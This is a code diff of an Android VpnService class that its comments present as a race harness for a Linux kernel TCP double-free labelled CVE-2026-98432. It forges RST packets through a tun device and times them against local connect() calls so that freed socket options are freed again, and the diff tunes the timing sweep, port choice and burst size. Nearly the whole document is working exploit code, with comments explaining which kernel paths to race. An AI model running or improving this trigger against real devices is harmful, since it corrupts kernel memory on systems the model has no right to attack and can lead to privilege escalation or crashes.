@@ -10,32 +10,65 @@ import java.net.InetAddress;
 import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicLong;
 
 /**
- * Dual-path race harness for CVE-2026-98432.
+ * Dual-path harness for CVE-2026-98432.
  *
- * CPU A: a real socket connects to one of our own addresses, so the kernel
- *        delivers the packet locally inside the connect() syscall. The ACK
- *        that drives tcp_v4_syn_recv_sock is therefore produced on a normal
- *        syscall path, not on the tun softirq path.
+ * The whole point is that the two halves of the race are driven through
+ * different kernel paths:
  *
- * CPU B: forged RSTs are written into the tun. tcp_check_req() drops the
- *        request socket for any RST without a sequence test, so an RST that
- *        lands during syn_recv_sock makes inet_ehash_nolisten() fail.
+ *   CPU A -- a real socket connects to one of our own addresses. The
+ *            destination is a local address, so ip_route_input() resolves
+ *            RTN_LOCAL and the packet is delivered inside the connect()
+ *            syscall. The ACK that reaches tcp_v4_syn_recv_sock() is
+ *            therefore produced on a normal syscall path, not on the tun
+ *            softirq path.
+ *
+ *   CPU B -- forged RSTs go in through the tun. tcp_check_req() drops the
+ *            request sock for any RST without consulting the sequence number
+ *            (verified in the shipped vmlinux), so an RST that lands while
+ *            syn_recv_sock() is running makes inet_ehash_nolisten() fail,
+ *            which is the path that frees inet_opt and then frees it again.
+ *
+ * Both halves used to share the single per-tun_file write queue lock, which
+ * serialised them and made the race impossible. That is what this split fixes.
+ *
+ * Counters tell us which case we are in:
+ *   ok grows, rst stays 0 -> the RSTs are dropped before reaching the socket
+ *                            (source is a local address and accept_local=0,
+ *                            so martian_source kills them)
+ *   rst grows             -> the RSTs reach the request socket and the race
+ *                            window is actually being exercised
  */
 public class MiniVpn extends VpnService implements Runnable {
 
     static final String TAG = "MiniVpn";
+
+    /** Address of the tun. This becomes a local address of the device. */
     static final String IP = "10.7.7.1";
+    /** Listener port. */
     static final int PORT = 47777;
-    static final int BASE_SPORT = 40000;
-    static final int SPORT_RANGE = 15000;
+    /** Client source ports are SPORT_BASE + (0 .. SPORT_RANGE-1). */
+    static final int SPORT_BASE = 20000;
+    static final int SPORT_RANGE = 20000;
+    /** Prime stride so consecutive rounds do not reuse a port too soon. */
+    static final int SPORT_STRIDE = 997;
+    /** Number of RSTs fired per round, kept below the tun tx queue depth. */
+    static final int BURST = 64;
 
     static volatile String status = "idle";
     static final AtomicLong rounds = new AtomicLong();
-    static final AtomicLong connOk = new AtomicLong();
-    static final AtomicLong connRst = new AtomicLong();
+    static final AtomicLong okCount = new AtomicLong();
+    static final AtomicLong rstCount = new AtomicLong();
+    static final AtomicLong errCount = new AtomicLong();
+
+    /** Hand-off between the client loop and the single persistent RST thread. */
+    private final AtomicBoolean armed = new AtomicBoolean(false);
+    private volatile int targetSport = 0;
+    private volatile long armNanos = 0;
+    private volatile long delayNanos = 0;
 
     private ParcelFileDescriptor pfd;
     private FileOutputStream fos;
@@ -50,18 +83,19 @@ public class MiniVpn extends VpnService implements Runnable {
             Builder b = new Builder();
             b.setSession("mini");
             b.addAddress(IP, 32);
-            b.addRoute("10.7.7.0", 24);
             pfd = b.establish();
             if (pfd == null) {
-                status = "establish null";
+                status = "establish returned null";
+                Log.e(TAG, status);
                 return START_STICKY;
             }
             fos = new FileOutputStream(pfd.getFileDescriptor());
             running = true;
             new Thread(this, "driver").start();
             status = "running";
+            Log.i(TAG, "tun up on " + IP + "/32");
         } catch (Throwable t) {
-            status = "start err " + t;
+            status = "start failed: " + t;
             Log.e(TAG, "start", t);
         }
         return START_STICKY;
@@ -70,73 +104,92 @@ public class MiniVpn extends VpnService implements Runnable {
     @Override
     public void run() {
         startListener();
-        sleep(200);
-        loop();
+        sleepQuiet(300);
+        Thread rstThread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                rstLoop();
+            }
+        }, "rst");
+        rstThread.start();
+        clientLoop();
     }
 
     private void startListener() {
         Thread t = new Thread(new Runnable() {
             @Override
             public void run() {
+                ServerSocket ss = null;
                 try {
-                    ServerSocket ss = new ServerSocket();
+                    ss = new ServerSocket();
                     ss.setReuseAddress(true);
-                    ss.bind(new InetSocketAddress(InetAddress.getByName(IP), PORT), 64);
+                    ss.bind(new InetSocketAddress(InetAddress.getByName(IP), PORT), 128);
                     while (running) {
                         Socket s = ss.accept();
                         s.close();
                     }
                 } catch (Throwable ex) {
-                    status = "listener " + ex;
+                    status = "listener: " + ex;
+                    Log.e(TAG, "listener", ex);
+                } finally {
+                    closeQuiet(ss);
                 }
             }
         }, "listen");
         t.start();
     }
 
-    private void loop() {
+    /**
+     * Single persistent writer, one burst per round, so we never create a
+     * thread per attempt.
+     */
+    private void rstLoop() {
+        while (running) {
+            if (!armed.compareAndSet(true, false)) {
+                Thread.yield();
+                continue;
+            }
+            int sport = targetSport;
+            long fireAt = armNanos + delayNanos;
+            while (System.nanoTime() < fireAt) {
+                // spin: the interesting window is only a few microseconds wide
+            }
+            byte[] pkt = buildRst(sport);
+            for (int k = 0; k < BURST; k++) {
+                try {
+                    fos.write(pkt);
+                } catch (Throwable t) {
+                    errCount.incrementAndGet();
+                    break;
+                }
+            }
+        }
+    }
+
+    private void clientLoop() {
         int i = 0;
         while (running) {
             i++;
-            final int sport = BASE_SPORT + (i % SPORT_RANGE);
-            final int offUs = (i % 24) * 40;
 
-            Thread t = new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    blast(sport, offUs);
-                }
-            }, "rst");
-            t.start();
+            int sport = SPORT_BASE + ((i * SPORT_STRIDE) % SPORT_RANGE);
+            targetSport = sport;
+            // Sweep the arrival delay across the SYN -> ACK gap.
+            delayNanos = ((long) (i % 20)) * 30000L;
+            armNanos = System.nanoTime();
+            armed.set(true);
 
             Socket c = new Socket();
             try {
                 c.setReuseAddress(true);
                 c.bind(new InetSocketAddress(InetAddress.getByName(IP), sport));
-                c.connect(new InetSocketAddress(IP, PORT), 120);
-                connOk.incrementAndGet();
-            } catch (Throwable ex) {
-                connRst.incrementAndGet();
+                c.connect(new InetSocketAddress(IP, PORT), 100);
+                okCount.incrementAndGet();
+            } catch (Throwable t) {
+                rstCount.incrementAndGet();
             } finally {
-                try { c.close(); } catch (Throwable ignored) { }
+                closeQuiet(c);
             }
             rounds.incrementAndGet();
-            sleep(1);
-        }
-    }
-
-    private void blast(int sport, int offUs) {
-        long t0 = System.nanoTime();
-        while (((System.nanoTime() - t0) / 1000L) < offUs) {
-            // spin until the SYN has had time to create the request sock
-        }
-        byte[] pkt = buildRst(sport);
-        for (int k = 0; k < 120; k++) {
-            try {
-                fos.write(pkt);
-            } catch (Throwable t) {
-                return;
-            }
         }
     }
 
@@ -164,9 +217,11 @@ public class MiniVpn extends VpnService implements Runnable {
         put16(p, 36, 0);
         put16(p, 38, 0);
 
-        int sum = ((addr >> 16) & 0xffff) + (addr & 0xffff);
+        int sum = 0;
         sum += ((addr >> 16) & 0xffff) + (addr & 0xffff);
-        sum += 6 + 20;
+        sum += ((addr >> 16) & 0xffff) + (addr & 0xffff);
+        sum += 6;
+        sum += 20;
         put16(p, 36, csum(p, 20, 20, sum));
         return p;
     }
@@ -204,7 +259,20 @@ public class MiniVpn extends VpnService implements Runnable {
         return (int) (~s) & 0xffff;
     }
 
-    static void sleep(long ms) {
-        try { Thread.sleep(ms); } catch (Throwable ignored) { }
+    static void closeQuiet(java.io.Closeable c) {
+        if (c == null) {
+            return;
+        }
+        try {
+            c.close();
+        } catch (Throwable ignored) {
+        }
+    }
+
+    static void sleepQuiet(long ms) {
+        try {
+            Thread.sleep(ms);
+        } catch (Throwable ignored) {
+        }
     }
 }
